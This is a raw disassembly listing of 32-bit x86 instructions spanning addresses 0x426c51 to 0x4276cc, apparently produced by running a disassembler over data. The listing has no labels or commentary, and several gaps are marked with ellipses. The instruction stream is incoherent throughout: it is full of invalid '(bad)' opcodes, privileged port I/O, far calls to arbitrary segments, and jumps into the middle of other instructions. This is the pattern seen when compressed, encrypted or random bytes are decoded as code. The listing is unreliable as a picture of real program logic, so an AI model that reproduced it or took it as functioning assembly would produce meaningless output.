  426c51:	xor    ah,BYTE PTR [edi+0x78fa715b]
  426c57:	jp     0x426c41
  426c59:	push   ebp
  426c5a:	js     0x426bde
  426c5c:	jge    0x426c83
  426c5e:	mov    ds:0x87bc7d13,al
  426c63:	cmp    ah,bh
  426c65:	cmp    DWORD PTR [edi+0x76615881],esi
  426c6b:	adc    esi,DWORD PTR [edi+0x0]
	...
  426cd5:	add    dl,ah
  426cd7:	pusha  
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0x51818cff
  426ce6:	sahf   
  426ce7:	lahf   
  426ce8:	add    DWORD PTR [eax],eax
  426cea:	inc    DWORD PTR [eax]
  426cec:	add    BYTE PTR [eax],al
  426cee:	mov    dh,0xa5
  426cf0:	and    BYTE PTR [edx+0x35],bl
  426cf3:	scas   al,BYTE PTR es:[edi]
  426cf4:	sub    ebx,DWORD PTR [edx+ecx*8]
  426cf7:	(bad)  
  426cf8:	dec    ebp
  426cf9:	jmp    0x426c97
  426cfb:	xchg   ebp,eax
  426cfc:	(bad)  
  426cfd:	xor    ebp,ebx
  426cff:	sbb    BYTE PTR [ebp+0x39],0xe8
  426d03:	outs   dx,DWORD PTR ds:[esi]
  426d04:	inc    ebp
  426d05:	pop    ds
  426d06:	inc    esi
  426d07:	les    edx,FWORD PTR [esi]
  426d09:	mov    ah,0x67
  426d0b:	mov    esp,0x9533ef81
  426d10:	push   es
  426d11:	shl    esp,cl
  426d13:	stos   DWORD PTR es:[edi],eax
  426d14:	cmp    eax,0x93c8c42c
  426d19:	lahf   
  426d1a:	xor    esp,DWORD PTR ds:0x3bebe374
  426d20:	cmp    eax,0xea39bbf1
  426d25:	loopne 0x426d03
  426d27:	gs mov cl,0x1b
  426d2a:	pop    edx
  426d2b:	retf   
  426d2c:	ss (bad) 
  426d2e:	fnstsw WORD PTR [edi]
  426d30:	and    al,0x1f
  426d32:	cli    
  426d33:	in     eax,0xa2
  426d35:	push   0xe1d77bf4
  426d3a:	ror    DWORD PTR [ecx+esi*2-0x460d48cf],1
  426d41:	jnp    0x426cf0
  426d43:	test   BYTE PTR ds:0xf7c05839,0x24
  426d4a:	mov    cs,WORD PTR [edx-0x13]
  426d4d:	mov    DWORD PTR [esi+ecx*1+0x74c538b7],esi
  426d54:	xchg   ecx,eax
  426d55:	cs sti 
  426d57:	shl    ebp,cl
  426d59:	pop    edi
  426d5a:	cli    
  426d5b:	mov    edx,?
  426d5d:	sub    edi,esi
  426d5f:	adc    ecx,DWORD PTR [ecx+0x4748e478]
  426d65:	adc    ah,0xd0
  426d68:	mov    dh,0x4d
  426d6a:	outs   dx,DWORD PTR ss:[esi]
  426d6c:	addr16 xchg edi,eax
  426d6e:	mov    dh,0x46
  426d70:	pop    esi
  426d71:	add    BYTE PTR [edi-0x98fd347],bl
  426d77:	jg     0x426d16
  426d79:	cmp    BYTE PTR [ebp+0x49],dh
  426d7c:	jmp    0x426da9
  426d7e:	lods   al,BYTE PTR ds:[esi]
  426d7f:	cld    
  426d80:	mov    ds:0x2e553a74,eax
  426d85:	cmp    eax,0xbc8a9970
  426d8a:	cld    
  426d8b:	shl    DWORD PTR [eax+0x25352fac],0xc7
  426d92:	xor    eax,0x40fc96f
  426d97:	add    BYTE PTR [ebp-0x600321e5],dl
  426d9d:	add    al,0x38
  426d9f:	repnz sbb al,0xe1
  426da2:	pop    ecx
  426da3:	push   0x4f
  426da5:	ficomp DWORD PTR [edi]
  426da7:	xchg   edi,eax
  426da8:	jle    0x426dd4
  426daa:	retf   0x88cf
  426dad:	stc    
  426dae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426daf:	mov    dh,BYTE PTR [eax-0x45]
  426db2:	sub    BYTE PTR [eax+0x33],al
  426db5:	push   0x7be64ab3
  426dba:	ins    DWORD PTR es:[edi],dx
  426dbb:	scas   al,BYTE PTR es:[edi]
  426dbc:	(bad)  
  426dbd:	icebp  
  426dbe:	ds push edi
  426dc0:	mov    dl,0x89
  426dc2:	mov    cl,0x38
  426dc4:	test   DWORD PTR [ecx-0x64],esp
  426dc7:	pop    ecx
  426dc8:	mov    eax,ds:0xd957cd14
  426dcd:	xor    edx,ebx
  426dcf:	xor    esp,DWORD PTR [ecx-0x1f72ae0]
  426dd5:	and    dl,BYTE PTR [edi]
  426dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426dd8:	push   0xffffffe1
  426dda:	mov    edx,0x945da65c
  426ddf:	adc    eax,DWORD PTR [edi+eiz*4+0x49f23794]
  426de6:	ss mov ecx,0x1931f7f9
  426dec:	mov    ds:0x0,al
	...
  426e55:	add    BYTE PTR [edx],cl
  426e57:	mov    cl,0x61
  426e59:	repz sti 
  426e5b:	repz call 0xb90c:0xc7c2ecf9
  426e63:	sbb    ah,BYTE PTR [ebp-0x4b]
  426e66:	popf   
  426e67:	mov    al,ds:0xff0001
  426e6c:	add    BYTE PTR [eax],al
  426e6e:	iret   
  426e6f:	adc    bl,BYTE PTR [ebp-0x2b]
  426e72:	sbb    al,0x6f
  426e74:	outs   dx,DWORD PTR ds:[esi]
  426e75:	push   edx
  426e76:	xchg   esi,eax
  426e77:	sub    eax,0xee7f63dc
  426e7c:	mov    WORD PTR [ebp+0x3e],?
  426e7f:	jo     0x426e89
  426e81:	(bad)
  426e85:	mov    ds:0xfc94eba9,al
  426e8a:	in     al,0x51
  426e8c:	(bad)  
  426e8d:	dec    edx
  426e8e:	sbb    al,0x3f
  426e90:	aad    0xca
  426e92:	xlat   BYTE PTR ds:[ebx]
  426e93:	jb     0x426ea7
  426e95:	push   dx
  426e97:	popf   
  426e98:	sub    eax,0x1a4210cb
  426e9d:	loopne 0x426ec7
  426e9f:	inc    esi
  426ea0:	ds repz hlt 
  426ea3:	(bad)  [edi-0x6a91add0]
  426ea9:	mov    ebx,0x329e076d
  426eae:	add    eax,DWORD PTR [ecx-0x4efae91]
  426eb4:	loopne 0x426ed7
  426eb6:	mov    DWORD PTR [ebp+eax*2-0x65],ecx
  426eba:	xchg   ebx,eax
  426ebb:	xchg   ebp,eax
  426ebc:	sub    al,0xd6
  426ebe:	push   ss
  426ebf:	push   ebx
  426ec0:	add    al,0x33
  426ec2:	jle    0x426e9b
  426ec4:	dec    esi
  426ec5:	imul   edi
  426ec7:	or     BYTE PTR [esi],dh
  426ec9:	or     eax,0xbee65976
  426ece:	loope  0x426e8d
  426ed0:	fld    DWORD PTR [ebx+esi*8+0x1c461465]
  426ed7:	call   FWORD PTR [edx]
  426ed9:	pop    ss
  426eda:	mov    ss,eax
  426edc:	sub    cl,al
  426ede:	popa   
  426edf:	jmp    0x426e70
  426ee1:	sti    
  426ee2:	fnstenv [esi-0x305f2c51]
  426ee8:	cwde   
  426ee9:	pushf  
  426eea:	push   ebx
  426eeb:	mov    edi,0xc86e607a
  426ef0:	dec    ecx
  426ef1:	js     0x426ec0
  426ef3:	pusha  
  426ef4:	retf   
  426ef5:	dec    ebx
  426ef6:	cdq    
  426ef7:	fst    DWORD PTR [esp+ebx*2-0x51f1eca6]
  426efe:	scas   al,BYTE PTR es:[edi]
  426eff:	and    eax,0xc1ace650
  426f04:	rcr    al,1
  426f06:	cs dec edi
  426f08:	or     al,0x67
  426f0a:	mov    al,0x5f
  426f0c:	dec    ecx
  426f0d:	push   ss
  426f0e:	in     eax,dx
  426f0f:	jnp    0x426f43
  426f11:	scas   eax,DWORD PTR es:[edi]
  426f12:	push   ds
  426f13:	push   ss
  426f14:	dec    edi
  426f15:	out    0xad,eax
  426f17:	into   
  426f18:	call   0xb26ec887
  426f1d:	fiadd  WORD PTR [eax+edi*2+0x3d04faf7]
  426f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f25:	cmp    DWORD PTR [esi],esi
  426f27:	xor    bl,BYTE PTR [ecx+0x625e23ab]
  426f2d:	sub    eax,0x53baaf1c
  426f32:	scas   al,BYTE PTR es:[edi]
  426f33:	adc    ebp,DWORD PTR ds:0x76a8e890
  426f39:	out    0x33,eax
  426f3b:	jno    0x426f0c
  426f3d:	and    ah,ch
  426f3f:	xchg   ebp,eax
  426f40:	adc    cl,BYTE PTR [ecx]
  426f42:	and    ecx,ebx
  426f44:	in     al,dx
  426f45:	data16 aas 
  426f47:	jb     0x426f38
  426f49:	mov    ss,WORD PTR [edx+0x3580009d]
  426f4f:	sub    BYTE PTR [eax+0x32],dl
  426f52:	cmp    DWORD PTR [eax-0x750fcfe6],edx
  426f58:	mov    dl,0x20
  426f5a:	pop    esp
  426f5b:	(bad)  
  426f5c:	mov    ebp,0xf5898e75
  426f61:	and    bh,BYTE PTR [edx-0x15]
  426f64:	repnz and al,0x83
  426f67:	mov    eax,ds:0xd94845e5
  426f6c:	jae    0x426f6e
	...
  426fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fd7:	mov    ds:0xf5c7f1c7,al
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [edi+eiz*4-0x6330df61],esp
  426fe7:	mov    eax,ds:0xff0001
  426fec:	add    BYTE PTR [eax],al
  426fee:	dec    ebp
  426fef:	jge    0x426f7b
  426ff1:	pop    ecx
  426ff2:	dec    bx
  426ff4:	adc    ah,BYTE PTR ss:[ecx+0x6ad435bf]
  426ffb:	sub    eax,0x4d6b28a5
  427000:	lock or BYTE PTR [ecx+0x23c56b32],0x57
  427008:	sysenter 
  42700a:	inc    esp
  42700b:	jo     0x42700b
  42700d:	shl    BYTE PTR [ecx-0x7384cc37],cl
  427013:	lds    esp,FWORD PTR fs:[eax-0x7a246695]
  42701a:	jno    0x427018
  42701c:	mov    ds:0xf9b64c83,al
  427021:	out    dx,eax
  427022:	loopne 0x42708a
  427024:	inc    ecx
  427025:	cmp    al,0x32
  427027:	in     eax,0x4
  427029:	xor    DWORD PTR [ebx-0x46c0fe7a],0xd6b88a2d
  427033:	sbb    bh,BYTE PTR [ecx-0x12d43750]
  427039:	sbb    al,0xf
  42703b:	ds popf 
  42703d:	into   
  42703e:	sti    
  42703f:	xchg   DWORD PTR [ecx-0x69],edi
  427042:	(bad)  
  427043:	in     eax,0x6c
  427045:	inc    eax
  427046:	inc    ebx
  427047:	adc    al,0x86
  427049:	pop    ebx
  42704a:	adc    al,0xb4
  42704c:	jo     0x427042
  42704e:	and    eax,0xc73fcad0
  427053:	fld    DWORD PTR [esi+ecx*4]
  427056:	sub    cl,ah
  427058:	leave  
  427059:	add    eax,DWORD PTR [edx]
  42705b:	jp     0x427034
  42705d:	repnz xchg ebp,eax
  42705f:	pop    eax
  427060:	fs mov al,0x45
  427063:	ds inc esp
  427065:	aaa    
  427066:	xor    BYTE PTR [ebp+0x64d87062],al
  42706c:	mov    ds:0x6a509a9,eax
  427071:	aaa    
  427072:	mov    BYTE PTR [edx-0x29b57b79],ah
  427078:	int3   
  427079:	out    0x94,al
  42707b:	sbb    BYTE PTR [edx-0x6ebb3d67],ah
  427081:	stos   BYTE PTR es:[edi],al
  427082:	clc    
  427083:	addr16 stc 
  427085:	jl     0x427060
  427087:	mov    al,ds:0x58dca724
  42708c:	mov    ds:0x48fc1f1f,eax
  427091:	lods   eax,DWORD PTR ds:[esi]
  427092:	imul   esp,DWORD PTR [ebx],0x21ac79b9
  427098:	je     0x427109
  42709a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42709b:	push   ebp
  42709c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42709e:	jmp    0x42702f
  4270a0:	aaa    
  4270a1:	test   BYTE PTR [edi-0x45],dl
  4270a4:	iret   
  4270a5:	out    0x8c,eax
  4270a7:	pop    ebx
  4270a8:	and    ebx,DWORD PTR [ecx+0x59]
  4270ab:	test   eax,0x52ef62bf
  4270b0:	mov    ecx,DWORD PTR ds:0x2a0a4d2b
  4270b6:	and    DWORD PTR [edx+0xa],0x33726117
  4270bd:	pop    ebx
  4270be:	fisub  DWORD PTR [ecx]
  4270c0:	push   edi
  4270c1:	fidivr DWORD PTR [ebp+0x1e77a4a7]
  4270c7:	sbb    eax,0x5e85d6de
  4270cc:	add    bh,BYTE PTR [edi]
  4270ce:	iret   
  4270cf:	hlt    
  4270d0:	add    al,0x8a
  4270d2:	clc    
  4270d3:	cmp    esp,DWORD PTR [esi]
  4270d5:	fsubr  QWORD PTR [ebx]
  4270d7:	jo     0x427097
  4270d9:	pop    edx
  4270da:	aaa    
  4270db:	outs   dx,DWORD PTR ds:[esi]
  4270dc:	leave  
  4270dd:	jae    0x4270a1
  4270df:	loop   0x4270f8
  4270e1:	fwait
  4270e2:	leave  
  4270e3:	sub    BYTE PTR [edi],dh
  4270e5:	clc    
  4270e6:	loopne 0x4270f1
  4270e8:	sub    BYTE PTR [ebp+0x445a14],bl
	...
  427156:	or     al,0x6d
  427158:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42715e:	inc    esp
  42715f:	mov    ebp,0x2ff19d96
  427164:	xchg   edi,eax
  427165:	push   0x1a29b
  42716a:	inc    DWORD PTR [eax]
  42716c:	add    BYTE PTR [eax],al
  42716e:	adc    al,0x3e
  427170:	iret   
  427171:	xor    al,0x22
  427173:	call   0x6d9e:0x8f3670e8
  42717a:	inc    esi
  42717b:	mov    ?,eax
  42717d:	loopne 0x427135
  42717f:	stc    
  427180:	ffreep st(0)
  427182:	jnp    0x427188
  427184:	aad    0xc8
  427186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427187:	inc    esp
  427188:	cmp    BYTE PTR [ebp+0x5f],bl
  42718b:	and    al,0xda
  42718d:	sub    al,0x7b
  42718f:	adc    edi,DWORD PTR [eax+0x5e]
  427192:	add    ch,ah
  427194:	jb     0x4271e0
  427196:	cmp    eax,0x80858e41
  42719b:	mov    ds:0x23f3f3d0,al
  4271a0:	mov    bh,0xd5
  4271a2:	cs mov eax,fs:0x6de1c3fd
  4271a9:	test   eax,0xbe19eaf5
  4271ae:	xchg   esp,eax
  4271af:	inc    ebp
  4271b0:	mov    dh,0xa6
  4271b2:	ffreep st(1)
  4271b4:	mov    cl,0x57
  4271b6:	mov    dh,0x51
  4271b8:	cmp    ah,BYTE PTR [esi+0x53]
  4271bb:	adc    ah,ch
  4271bd:	pushf  
  4271be:	fcomp  QWORD PTR [edi-0x40]
  4271c1:	pop    DWORD PTR [ebx+0x8]
  4271c4:	stos   DWORD PTR es:[edi],eax
  4271c5:	pusha  
  4271c6:	mov    bl,0x8c
  4271c8:	fild   WORD PTR [edx]
  4271ca:	cmp    edx,DWORD PTR [ebx]
  4271cc:	dec    edi
  4271cd:	sub    DWORD PTR [edi],0xffffffbd
  4271d0:	gs and ecx,edi
  4271d3:	inc    esi
  4271d4:	mov    cl,0x4e
  4271d6:	in     al,0xb7
  4271d8:	shl    DWORD PTR [ebp-0x2bb8dc9d],1
  4271de:	in     al,0xb0
  4271e0:	es mov dh,0xaa
  4271e3:	or     eax,0xbfd6dcf0
  4271e8:	leave  
  4271e9:	adc    BYTE PTR [ebx-0x41],dl
  4271ec:	clc    
  4271ed:	sbb    ah,dl
  4271ef:	lods   eax,DWORD PTR ds:[esi]
  4271f0:	sbb    dl,ch
  4271f2:	mov    ds:0x3ce7d483,eax
  4271f7:	lea    edx,[esi+esi*2+0x1bec9c2f]
  4271fe:	adc    BYTE PTR [eax],ah
  427200:	popa   
  427201:	mov    edi,0x9436936f
  427206:	push   edx
  427207:	jl     0x4271f9
  427209:	push   ds
  42720a:	repnz int 0x38
  42720d:	pushf  
  42720e:	fwait
  42720f:	dec    ecx
  427210:	inc    ebx
  427211:	push   0x17fd6fba
  427216:	pop    esp
  427217:	jge    0x4271f7
  427219:	hlt    
  42721a:	xchg   esp,eax
  42721b:	inc    edi
  42721c:	dec    ecx
  42721d:	inc    edi
  42721e:	scas   eax,DWORD PTR es:[edi]
  42721f:	and    DWORD PTR [ecx],ebp
  427221:	jo     0x427237
  427223:	push   eax
  427224:	mov    WORD PTR [esi-0x47df9da3],?
  42722a:	pop    eax
  42722b:	cmp    eax,0xb8b13bbc
  427230:	pop    esp
  427231:	(bad)  
  427233:	xchg   ebx,eax
  427234:	es mov ebp,0xf1ae9b2a
  42723a:	mov    ecx,0x1ba12242
  42723f:	fidiv  WORD PTR [edi]
  427241:	bswap  ecx
  427243:	loope  0x4271d3
  427245:	sub    ah,cl
  427247:	cdq    
  427248:	fisub  DWORD PTR [eax]
  42724a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42724b:	aaa    
  42724c:	push   eax
  42724d:	inc    eax
  42724e:	sbb    eax,0x4276d9f5
  427253:	mov    cl,0xcd
  427255:	pop    ss
  427256:	sub    eax,0x1285f9c6
  42725b:	call   0xba46:0xb74876ae
  427262:	ret    
  427263:	fisub  DWORD PTR [eax-0x24]
  427266:	and    edi,ecx
  427268:	cs inc ecx
  42726a:	rcr    DWORD PTR [ecx+ecx*4],0x0
	...
  4272d6:	push   ds
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0xbb59bdad,al
  4272e6:	call   0x0:0xff0001a3
  4272ed:	add    BYTE PTR [ebp+0xde2ffef],bl
  4272f3:	xchg   BYTE PTR [edx-0x4e94bf95],ah
  4272f9:	(bad)  
  4272fa:	aad    0xeb
  4272fc:	call   DWORD PTR [ecx+ebx*4+0x2a]
  427300:	push   ds
  427301:	and    eax,0x468109db
  427306:	scas   al,BYTE PTR es:[edi]
  427307:	les    edx,FWORD PTR ds:0x9536ad84
  42730d:	test   BYTE PTR [edx-0x48],dl
  427310:	cdq    
  427311:	jl     0x427345
  427313:	sub    dl,BYTE PTR [ebx+0x7bb9aeca]
  427319:	popa   
  42731a:	in     al,dx
  42731b:	int3   
  42731c:	add    al,ch
  42731e:	stos   DWORD PTR es:[edi],eax
  42731f:	cli    
  427320:	cmp    ebx,esi
  427322:	mov    gs,WORD PTR [eax+0x46]
  427325:	add    eax,0x2b73c956
  42732a:	nop
  42732b:	cmc    
  42732c:	mov    eax,ds:0x8a8cb1da
  427331:	jo     0x4272ee
  427333:	fst    DWORD PTR [ebx-0x3c0d0ac5]
  427339:	jne    0x427345
  42733b:	aam    0x71
  42733d:	jnp    0x427320
  42733f:	dec    esi
  427340:	dec    esp
  427341:	imul   ebx,esi,0x7d
  427344:	hlt    
  427345:	xchg   ecx,eax
  427346:	xor    eax,0x15066a75
  42734b:	mov    cl,0xf0
  42734d:	fcomi  st,st(5)
  42734f:	aad    0xed
  427351:	push   ss
  427352:	loop   0x427322
  427354:	push   ss
  427355:	out    dx,al
  427356:	test   eax,0xedc44670
  42735b:	jge    0x4272f0
  42735d:	jns    0x427320
  42735f:	and    BYTE PTR [di+0x5b],0x4f
  427364:	pop    ebp
  427365:	shl    BYTE PTR ds:[esp+edx*4+0x1d],cl
  42736a:	nop
  42736b:	ins    BYTE PTR es:[edi],dx
  42736c:	pop    ss
  42736d:	xchg   edx,eax
  42736e:	test   ecx,esi
  427370:	dec    edx
  427371:	hlt    
  427372:	(bad)  [ebx]
  427374:	ja     0x427373
  427376:	ss std 
  427378:	xor    al,0x5b
  42737a:	jae    0x427313
  42737c:	jmp    0x4273f0
  42737e:	jmp    0x901215c4
  427383:	sbb    al,0xe9
  427385:	sub    DWORD PTR [ebx],ebp
  427387:	mov    dl,0xbf
  427389:	mov    cl,0x3a
  42738b:	stos   DWORD PTR es:[edi],eax
  42738c:	cli    
  42738d:	int    0x2
  42738f:	or     eax,DWORD PTR [ebx]
  427391:	mov    ecx,0x46569117
  427396:	and    al,0x6
  427398:	push   ecx
  427399:	xor    ah,BYTE PTR [ecx]
  42739b:	enter  0x2b9e,0x9e
  42739f:	dec    ebx
  4273a0:	stos   BYTE PTR es:[edi],al
  4273a1:	push   eax
  4273a2:	jp     0x427332
  4273a4:	inc    esp
  4273a5:	stos   DWORD PTR es:[edi],eax
  4273a6:	pop    ecx
  4273a7:	adc    eax,0x93c5420f
  4273ac:	dec    edi
  4273ad:	out    dx,al
  4273ae:	popa   
  4273af:	mov    eax,ds:0xfe445f2b
  4273b4:	(bad)  
  4273b5:	fcom   QWORD PTR [edx+edi*4]
  4273b8:	add    al,0xc0
  4273ba:	aam    0xcb
  4273bc:	inc    edx
  4273bd:	pop    ecx
  4273be:	inc    esi
  4273bf:	mov    ds:0x93ffe3fc,eax
  4273c4:	mov    cl,0x8f
  4273c6:	aad    0x4f
  4273c8:	in     al,0xe3
  4273ca:	mov    al,0x12
  4273cc:	xchg   DWORD PTR [eax+0x2e],edi
  4273cf:	mov    al,0xef
  4273d1:	push   es
  4273d2:	adc    eax,0x8f82d33
  4273d7:	loopne 0x4273ba
  4273d9:	jmp    0x73da:0x828270f9
  4273e0:	mov    WORD PTR [ebx],ds
  4273e2:	(bad)  
  4273e3:	call   0xfb3502e4
  4273e8:	push   ebx
  4273e9:	add    DWORD PTR [ebx+edi*1+0xd3],ebx
	...
  427454:	add    BYTE PTR [eax],al
  427456:	adc    bl,BYTE PTR ds:0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    esi,DWORD PTR [ebx-0x7]
  427464:	inc    esp
  427465:	hlt    
  427466:	cdq    
  427467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427468:	add    DWORD PTR [eax],eax
  42746a:	inc    DWORD PTR [eax]
  42746c:	add    BYTE PTR [eax],al
  42746e:	psrld  mm1,QWORD PTR [ebx+0x1d]
  427472:	mov    bh,0x68
  427474:	sub    esp,ebp
  427476:	and    eax,0xff63bdf2
  42747b:	push   esi
  42747c:	jo     0x4274e8
  42747e:	push   ds
  42747f:	int    0xfd
  427481:	mov    cl,0x5e
  427483:	mov    cl,0xde
  427485:	sub    eax,0x9188c933
  42748a:	test   DWORD PTR ds:0x84aa8a3b,0xae3c689d
  427494:	inc    eax
  427495:	repz lds ebp,FWORD PTR [esi]
  427498:	pop    ebp
  427499:	adc    ecx,DWORD PTR ss:[edx]
  42749c:	stos   DWORD PTR es:[edi],eax
  42749d:	dec    esi
  42749e:	gs (bad) 
  4274a1:	pop    es
  4274a2:	mov    DWORD PTR [edi+0x551d33e3],ecx
  4274a8:	stos   DWORD PTR es:[edi],eax
  4274a9:	sbb    al,0x45
  4274ab:	and    al,0xd4
  4274ad:	jne    0x427500
  4274af:	dec    esi
  4274b0:	adc    dh,dh
  4274b2:	lods   eax,DWORD PTR ds:[esi]
  4274b3:	xchg   ebp,eax
  4274b4:	scas   eax,DWORD PTR es:[edi]
  4274b5:	or     BYTE PTR [edx+0x1fe104c0],bl
  4274bb:	rcl    BYTE PTR [ecx+0x4dc2716a],cl
  4274c1:	sbb    al,0xf8
  4274c3:	jns    0x42753c
  4274c5:	cmp    BYTE PTR [ebp-0x1f],al
  4274c8:	mov    bl,0x23
  4274ca:	aas    
  4274cb:	cmp    edx,edi
  4274cd:	daa    
  4274ce:	sbb    dh,dl
  4274d0:	and    BYTE PTR [eax],ah
  4274d2:	lods   eax,DWORD PTR ds:[esi]
  4274d3:	ss jns 0x427555
  4274d6:	jecxz  0x42745f
  4274d8:	in     al,dx
  4274d9:	addr16 add ebx,edx
  4274dc:	cmp    al,0x62
  4274de:	xor    DWORD PTR [edi],esp
  4274e0:	add    bl,ah
  4274e2:	icebp  
  4274e3:	fucomip st,st(7)
  4274e5:	nop
  4274e6:	add    DWORD PTR [eax],0x59
  4274e9:	inc    edi
  4274ea:	ret    0x380e
  4274ed:	fwait
  4274ee:	cmp    DWORD PTR [ebx+edi*4],ebp
  4274f1:	out    0x80,eax
  4274f3:	inc    esi
  4274f4:	popf   
  4274f5:	inc    ebp
  4274f6:	stc    
  4274f7:	push   ecx
  4274f8:	jae    0x427558
  4274fa:	lods   al,BYTE PTR ds:[esi]
  4274fb:	popf   
  4274fc:	shl    BYTE PTR [ecx],1
  4274fe:	ja     0x4274dc
  427500:	ret    0xe608
  427503:	ins    BYTE PTR es:[edi],dx
  427504:	or     eax,0x56545a0b
  427509:	fdivr  st,st(7)
  42750b:	jnp    0x4274ba
  42750d:	xor    esp,DWORD PTR [eax+0x5becc02]
  427513:	repz or dl,BYTE PTR [eax+0x1f71c71f]
  42751a:	(bad)  
  42751b:	jne    0x427515
  42751d:	aaa    
  42751e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42751f:	xor    eax,DWORD PTR [ebx+0x46a77133]
  427525:	dec    eax
  427526:	fs cli 
  427528:	xor    al,0x63
  42752a:	mov    BYTE PTR [eax],ch
  42752c:	xchg   ebx,eax
  42752d:	sub    DWORD PTR [ebx+0x7c7c2281],ebx
  427533:	retf   
  427534:	fbstp  TBYTE PTR [edi+ebx*2]
  427537:	(bad)  
  427538:	ins    DWORD PTR es:[edi],dx
  427539:	(bad)  
  42753a:	xchg   ecx,eax
  42753b:	ins    DWORD PTR es:[edi],dx
  42753c:	and    ebp,DWORD PTR [esi-0x2d9c6aa8]
  427542:	pop    esp
  427543:	fwait
  427544:	jmp    0x174a:0x434c9d46
  42754b:	xchg   ebx,eax
  42754c:	mov    ah,0x84
  42754e:	sbb    BYTE PTR [ebp-0x52],ch
  427551:	mov    eax,0x109ec040
  427556:	xlat   BYTE PTR ds:[ebx]
  427557:	xor    DWORD PTR [esi-0x219cf9a2],edx
  42755d:	xchg   ecx,eax
  42755e:	push   ebx
  42755f:	dec    edi
  427560:	cmp    BYTE PTR [edx],cl
  427562:	out    0x8c,eax
  427564:	inc    eax
  427565:	inc    esp
  427566:	jno    0x4275de
  427568:	cli    
  427569:	add    BYTE PTR [edx+0x307e],dl
	...
  4275d3:	add    BYTE PTR [eax],al
  4275d5:	add    BYTE PTR [eax+ebp*4-0x40],bl
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	jmp    0x4275b4
  4275e4:	pop    edx
  4275e5:	add    BYTE PTR [eax-0xfffe5b],bl
  4275eb:	add    BYTE PTR [eax],al
  4275ed:	add    BYTE PTR [edx-0x4c],ah
  4275f0:	mov    ds:0x6cbce9e2,eax
  4275f5:	arpl   WORD PTR [ecx+0x73],dx
  4275f8:	hlt    
  4275f9:	pop    esi
  4275fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275fb:	inc    ecx
  4275fc:	xchg   BYTE PTR [edx-0x526a24bc],dl
  427602:	mov    dl,0x56
  427604:	xchg   edx,eax
  427605:	pop    esi
  427606:	aad    0x4e
  427608:	mov    edi,0x69e881f6
  42760d:	jbe    0x427656
  42760f:	sub    BYTE PTR [edi+0x29],ch
  427612:	jecxz  0x427634
  427614:	mov    ah,BYTE PTR [edi+0x73e87a54]
  42761a:	test   bl,ah
  42761c:	clc    
  42761d:	leave  
  42761e:	push   edi
  42761f:	div    bh
  427621:	fidiv  WORD PTR [edi+eiz*8]
  427624:	loope  0x427670
  427626:	arpl   di,si
  427628:	ja     0x42760e
  42762a:	push   cs
  42762b:	pop    eax
  42762c:	dec    edi
  42762d:	(bad)  
  42762e:	mov    ebx,0x741a0801
  427633:	fcomp  QWORD PTR [esi]
  427635:	outs   dx,DWORD PTR ds:[esi]
  427636:	mov    gs,WORD PTR [edx-0x5d]
  427639:	and    al,0x6e
  42763b:	add    DWORD PTR [edi],edx
  42763d:	test   al,0x78
  42763f:	push   0x6726f8c7
  427644:	inc    edx
  427645:	sub    ah,dh
  427647:	pop    esi
  427648:	shl    DWORD PTR [ecx+0x3a92b2ac],cl
  42764e:	ds pushf 
  427650:	pop    edx
  427651:	xchg   edi,eax
  427652:	(bad)  
  427653:	in     al,0x2
  427655:	mov    bl,0x99
  427657:	scas   al,BYTE PTR es:[edi]
  427658:	mov    WORD PTR [esi+ecx*2],fs
  42765b:	jno    0x427651
  42765d:	pushf  
  42765e:	jp     0x42762c
  427660:	jg     0x42768f
  427662:	pop    ss
  427663:	rcr    ebx,cl
  427665:	push   edx
  427666:	add    ebx,esp
  427668:	fsub   DWORD PTR [ebx+0x3ff6ac6b]
  42766e:	shl    BYTE PTR [edi+0x61f10a91],0x93
  427675:	adc    eax,0x2cb8a305
  42767a:	jno    0x4275ff
  42767c:	xchg   esi,eax
  42767d:	jmp    0xf412faf3
  427682:	inc    ebx
  427683:	sbb    ebp,edi
  427685:	mov    ebx,DWORD PTR [ebx]
  427687:	in     eax,dx
  427688:	test   eax,0x52f54e53
  42768d:	push   esp
  42768e:	mov    WORD PTR [ebx-0x79],?
  427691:	and    BYTE PTR [edx+0x698fea0c],ch
  427697:	popf   
  427698:	imul   BYTE PTR [esi+0x20]
  42769b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42769c:	and    BYTE PTR [esp+eiz*4+0x19],0xdf
  4276a1:	out    0xf7,al
  4276a3:	in     eax,0xe9
  4276a5:	(bad)  
  4276a6:	sub    ebx,ebp
  4276a8:	inc    eax
  4276a9:	fcomi  st,st(4)
  4276ab:	dec    ecx
  4276ac:	push   edi
  4276ad:	push   ss
  4276ae:	mov    ecx,0x2f033c66
  4276b3:	dec    esi
  4276b4:	and    DWORD PTR [ebp+ebp*2-0x1bb5ab2a],esi
  4276bb:	ret    
  4276bc:	pop    edi
  4276bd:	push   0x61
  4276bf:	call   esp
  4276c1:	leave  
  4276c2:	adc    eax,0xda5d860
  4276c7:	(bad)  
  4276c8:	pop    ds
  4276c9:	fild   QWORD PTR [edx]
  4276cb:	ins    BYTE PTR es:[edi],dx
  4276cc:	mov    eax,ds:0xda6a7a1f
